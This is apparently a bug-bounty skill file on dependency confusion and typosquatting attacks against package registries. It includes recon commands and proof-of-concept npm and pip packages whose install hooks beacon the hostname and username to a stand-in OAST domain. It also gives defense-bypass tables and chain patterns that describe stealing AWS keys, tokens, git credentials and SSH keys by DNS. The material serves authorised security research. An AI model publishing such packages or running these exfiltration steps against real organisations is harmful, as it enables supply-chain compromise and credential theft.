---
name: dependency-confusion
category: vulnerabilities
description: Dependency confusion via public-registry hijack of internal package names across npm, pip, RubyGems, Maven, NuGet, and Go
depends_on: []
---

# Dependency Confusion

Build systems resolve package names from configured registries. When a private name is not scoped/locked and the resolver also consults a public registry, publishing the same name at a higher version on the public registry causes the build to prefer the attacker's package. Alex Birsan's 2021 research paid out over $130k across Apple, Microsoft, PayPal, Shopify, Netflix, Uber, Tesla, and Yelp using exactly this pattern. Still live in 2024-2026 because most programs still leak internal names somewhere.

## Discovery Signals

| # | Signal | Where to Check | Implication |
|---|--------|---------------|-------------|
| 1 | Unscoped npm packages in `package.json` | Public GitHub repos: `org:TARGET filename:package.json` | No `@scope/` prefix means npm resolves globally |
| 2 | `.npmrc` with mixed registry config | Public repos, Docker layers, CI logs | `registry=` + `always-auth=false` enables fallthrough |
| 3 | `--extra-index-url` in pip config | `pip.conf`, `requirements.txt`, CI scripts | Falls through to PyPI on miss from private index |
| 4 | Internal package names in JS source maps | `.js.map` files, webpack chunk manifests | Full `node_modules` paths reveal private names |
| 5 | Docker images on public registries | `docker history`, layer diff, `/app/package.json` | Build artifacts contain dependency manifests |
| 6 | Public CI logs showing `npm install` | CircleCI, Travis, public GitHub Actions workflows | Package names and registry URLs visible in output |
| 7 | npm org page with sparse packages | `https://www.npmjs.com/~ORG` | Missing packages = candidates for confusion |
| 8 | `Gemfile` without explicit `source` blocks per gem | Public repos, Gemfile.lock | Bundler resolves from global source pool (H1 #1104874: $5k) |
| 9 | Mobile app bundles (APK/IPA) | Decompile, strings, embedded JS | Internal package names in bundled node_modules |
| 10 | Job postings citing internal tooling by name | LinkedIn, company careers page | Internal framework/library names leaked publicly |
| 11 | Artifactory/Nexus virtual repos | Config files, admin panel if exposed | Fallthrough to public on miss without exclusion rules |
| 12 | `@scope` not claimed on npm | `curl https://registry.npmjs.org/-/org/TARGET` | 404 = unclaimed scope; register it and publish under it |

## Package Manager Behavior Matrix

| Manager | Resolution Order | Confusion Vector | PoC Method |
|---------|-----------------|-----------------|------------|
| **npm** | Unscoped: highest version across all configured registries; Scoped: `@scope:registry=` in `.npmrc` if set | Unscoped name + no lockfile integrity = public wins at higher version | `preinstall` script in `package.json`; DNS callback via `dns.lookup()` |
| **pip** | `--index-url` checked first; `--extra-index-url` is additive (falls through to PyPI) | `extra-index-url` misconfig: private miss -> PyPI fallback | `setup.py` `cmdclass` override; `socket.getaddrinfo()` DNS exfil |
| **gem (Bundler)** | Source priority per `source` block; `<2.2.10`: ambiguous for transitive deps | Global `source` + internal gem name = public higher version wins | `extconf.rb` extension build hook; DNS or HTTP callback |
| **Maven** | `groupId:artifactId` from `pom.xml` repositories in declaration order | Corporate reverse-DNS groupId not claimed on Maven Central | `maven-antrun-plugin` exec in `pom.xml` |
| **NuGet** | `packageSourceMapping` (2021+) pins sources; legacy `packages.config` has no pinning | Legacy projects without `packageSourceMapping`; `nuget.config` ordering | `init.ps1`/`install.ps1` under `tools/` (legacy `packages.config` only) |
| **Go** | VCS-tied paths (`github.com/org/repo`); `GOPROXY` controls resolution | `GOPROXY` misconfig with private-proxy fallthrough to `proxy.golang.org`; vanity-URL domain takeover | Module `init()` function; rare -- Go is largely immune |
| **Cargo** | `crates.io` default; `registry` field in `Cargo.toml` for alternates | Private registry fallthrough; `[patch]` section hijack | `build.rs` build script execution |
| **Composer** | `packagist.org` default; `repositories` in `composer.json` | Unnamespaced package + Packagist fallback | `post-install-cmd` script in `composer.json` |

## Attack Surface

**Sources of Internal Package Names**
- Public GitHub repos, forks, gists: `org:TARGET filename:package.json`
- JS source maps (`.js.map`) revealing full `node_modules` paths
- Frontend bundles: webpack chunk manifests, `webpackChunk_` globals
- Docker images on public registries -- `docker history`, layer diff
- Public CI logs (CircleCI/Travis/public GH Actions workflows)
- `.npmrc`, `pip.conf`, `Gemfile.lock`, `package-lock.json` committed in public artifacts
- Job postings citing internal frameworks by name
- Mobile app binaries (APK/IPA): strings, embedded JS bundles

**Registry-Side Misconfiguration**
- Artifactory/Sonatype Nexus virtual repos falling through to public on miss
- npm Enterprise with mixed `registry=` and `always-auth=false`
- AWS CodeArtifact upstream to `npmjs` without symbol exclusion configured
- GitHub Packages with `registry-url` set per-scope only, everything else resolves to public

## Discovery Methodology

### Step 1: Harvest Internal Names

**GitHub dorking**
```
org:TARGET filename:package.json
org:TARGET filename:requirements.txt
org:TARGET filename:Gemfile
org:TARGET filename:pom.xml
org:TARGET ".npmrc"
```

**Extract from JS bundles**
```bash
curl -s https://target.tld/static/js/main.js | \
  grep -oE '"[a-z0-9_@/-]+":"[0-9]+\.[0-9]+' | cut -d'"' -f2
```

**Docker layer mining**
```bash
docker pull target/app:latest
docker save target/app:latest | tar -xO --wildcards '*/layer.tar' | \
  tar -tv | grep -E 'package\.json|requirements\.txt|Gemfile\.lock'
```

### Step 2: Verify Not Claimed on Public Registry

```bash
# npm
npm view INTERNAL_NAME 2>&1 | grep -E '404|not found'
# pip
curl -s -o /dev/null -w "%{http_code}\n" https://pypi.org/pypi/INTERNAL_NAME/json
# RubyGems
gem info INTERNAL_NAME --remote 2>&1 | grep -i 'not found'
# Maven Central
curl -s "https://search.maven.org/solrsearch/select?q=a:INTERNAL_NAME&rows=1&wt=json" | jq .response.numFound
# NuGet
curl -s -o /dev/null -w "%{http_code}\n" "https://api.nuget.org/v3-flatcontainer/INTERNAL_NAME/index.json"
# npm scope
curl -s -o /dev/null -w "%{http_code}\n" https://registry.npmjs.org/-/org/TARGET
```

**Tooling**: `confused` (visma-prodsec/confused), `snyk-depfinder`, `depi`

### Step 3: Publish the PoC

**npm** (`package.json`)
```json
{
  "name": "INTERNAL_NAME",
  "version": "99.99.99",
  "scripts": { "preinstall": "node hello.js" }
}
```
`hello.js` -- DNS-only callback:
```js
const dns = require('dns');
const id = `${require('os').hostname()}.${process.env.USER||'u'}.${Date.now()}`;
dns.lookup(`${id}.OAST.DOMAIN`, () => {});
```

**pip** (`setup.py`)
```python
from setuptools import setup
from setuptools.command.install import install
import socket, os, time
class Beacon(install):
    def run(self):
        h = f"{socket.gethostname()}.{os.getenv('USER','u')}.{int(time.time())}.OAST.DOMAIN"
        try: socket.getaddrinfo(h, 53)
        except Exception: pass
        install.run(self)
setup(name="INTERNAL_NAME", version="99.99.99", cmdclass={"install": Beacon})
```

**Keep it benign.** DNS callback + hostname + username only. No file reads, no command execution, no persistence.

### Step 4: Confirm Installation

Monitor the OAST domain. A DNS hit with the victim's build hostname and username is mechanical proof. Also watch for:
- Corporate egress ranges (ASN of target org)
- CI provider IPs (CircleCI, GH Actions, Jenkins cloud)
- Build timestamps clustering around CI schedule
- Hostname patterns like `runner-*`, `ip-10-*`, `jenkins-*`

## Defense-Bypass Pairs

| Defense | Bypass | Technique |
|---------|--------|-----------|
| Scoped packages (`@org/pkg`) | Scope not claimed on npm | Register `@org` on npm if unclaimed; publish under it |
| `package-lock.json` with integrity hashes | Lock not present or `npm install` (not `npm ci`) | `npm install` updates lock; `npm ci` enforces it |
| Bundler `source` blocks (2.2.10+) | Transitive deps resolved globally pre-2.2.10 | Target projects on older Bundler versions |
| `packageSourceMapping` (NuGet) | Legacy `packages.config` projects | Only `PackageReference` projects enforce mapping |
| Private registry with auth | `pip --extra-index-url` fallthrough | Private miss = fallthrough to public PyPI |
| AWS CodeArtifact upstream exclusion | Exclusion rules not configured | Default config allows all public names through |
| `npm audit signatures` / provenance | Signatures not enforced; only advisory | No build system fails on missing provenance by default |
| Version pinning in lockfile | Lockfile not regenerated / stale | Stale lock + new dependency = public resolution |
| `GOPROXY=off` for private modules | Developer overrides with `GOPROXY=direct` | Individual misconfig on dev machine still vulnerable |
| Git diff-based CI review automation | Parser confusion in diff format | H1 #1167608: crafted diff lines bypass Homebrew BrewTestBot approval |

## Variant: Scope Hijack

Check scope-claim status:
```bash
curl -s -o /dev/null -w "%{http_code}\n" https://registry.npmjs.org/-/org/TARGET
# 404 = unclaimed, go register it
```

## Variant: Typosquat

Generate neighbors and register unclaimed ones:
```bash
pip install typogen
typogen requests | while read c; do
  code=$(curl -s -o /dev/null -w "%{http_code}" https://pypi.org/pypi/$c/json)
  [ "$code" = "404" ] && echo "FREE: $c"
done
```
Classes: character swap (`reqeusts`), missing (`reqests`), insertion (`requestss`), homoglyph (Cyrillic `o`), hyphen/underscore, scope flip (`colors` vs `@colors/colors`).

## Chain Patterns

| First Bug | Second Bug | Combined Impact | Example |
|-----------|-----------|----------------|---------|
| Dep confusion install | CI secret exfil via env vars | Cloud account takeover | `preinstall` reads `$AWS_ACCESS_KEY_ID`, `$GITHUB_TOKEN`; DNS exfils to OAST |
| Internal name leak (source map) | Public registry claim | RCE on build infra | H1 #1039085875: Facebook flipper `eslint-plugin-flipper` unclaimed on npm |
| Dep confusion install | Git credential theft | Source code compromise | `preinstall` reads `~/.git-credentials`, `~/.ssh/id_rsa` |
| Dep confusion install | npm token theft from `.npmrc` | Supply chain propagation | Stolen token publishes malicious versions of org's real packages |
| CI pipeline variable injection | Task redirection | Persistent supply chain backdoor | Azure Pipelines `##vso[task.setvariable]` hijacks task download URL |
| Accidental publish of internal pkg | Credential embedded in source | AWS/cloud account compromise | H1 Infosys: `ihip` package on PyPI contained `AdministratorAccess` AWS keys |
| Diff parser confusion in CI review | Automated merge of malicious code | Supply chain RCE on all downstream users | H1 #1167608: git_diff gem misparse lets Ruby injection pass BrewTestBot |
| Dep confusion on blockchain project | Validator/node compromise | Network-level attack | H1 #1187816: Sifnode unclaimed npm packages affect node operators |

## Bug-Bounty Framing

**What makes this payable**
- Program explicitly includes internal infrastructure, CI/CD, or "supply chain" in scope
- Organization publishes packages publicly (has an npm org, PyPI user, etc.)
- Evidence of internal names in public artifacts
- DNS callback from an IP or hostname clearly owned by the target
- Minimal payload, promptly disclosed, with immediate `npm unpublish` offered

**Common triager pushback and how to preempt it**
- "We use private registries only." -- Show the `.npmrc`/`pip.conf` misconfig or the callback itself
- "This is the dev's laptop, not production." -- Enumerate the CI hostname pattern from the callback
- "We'd need real exploitation." -- DNS+hostname+username is the industry-accepted PoC
- "We already have this name." -- Show version lookup proving your `99.99.99` is higher

## Pro Tips

1. Always publish a benign PoC first; DNS callback + hostname + username only -- the difference between a payout and a legal letter is restraint
2. `npm unpublish` has a 72-hour window -- time your testing and disclosure around it
3. Scope hijack on npm and groupId hijack on Maven are higher-signal than typosquat -- prioritize them
4. The Go ecosystem is largely immune unless evidence of `GOPROXY` misconfig; don't waste hours there
5. DNS exfil works where HTTP is blocked -- CI/CD environments almost always allow DNS resolution
6. When a hit comes back, immediately `unpublish`/deprecate to shrink the window
7. H1 #1104874 (Shopify $5k): the `okra` gem callback revealed hostname `oscillatinghost` and user `fernando` -- CI hostname patterns are the proof that matters
8. Facebook's `eslint-plugin-flipper` was found via `org:facebook` GitHub dork + `confused` tool -- the methodology is mechanical and reproducible
9. Internal package names in Docker image layers are often overlooked -- `docker save | tar` is a 30-second recon step
10. Azure Pipelines `##vso[task.setvariable]` is a post-install escalation: after confusion gets code running, this hijacks the entire pipeline control plane

## Validation

1. Specific internal package name harvested from a public source, with screenshot
2. Public-registry lookup showing the name was unclaimed
3. Published package visible on the public registry with your benign PoC code
4. OAST callback from a target-owned or target-CI host -- DNS log with hostname + timestamp
5. Minimal impact demonstrated; no exfil beyond hostname/username

## False Positives

- Name already claimed by another unrelated user (check publish history)
- Callback from random users fetching new packages (filter by target's ASN/hostname pattern)
- Name exists only in a public fork, not in actual internal infrastructure
- Build uses `npm ci` with lockfile + integrity hashes and the malicious version is never installed
- Target has `packageSourceMapping`, scoped registry mapping, or equivalent

## Impact

- RCE on build agents and developer machines during install hooks
- CI/CD secret extraction (cloud creds, SCM tokens, artifact signing keys)
- Supply-chain compromise propagating to every downstream deployment
- Persistent access via leaked long-lived tokens and modified CI workflows
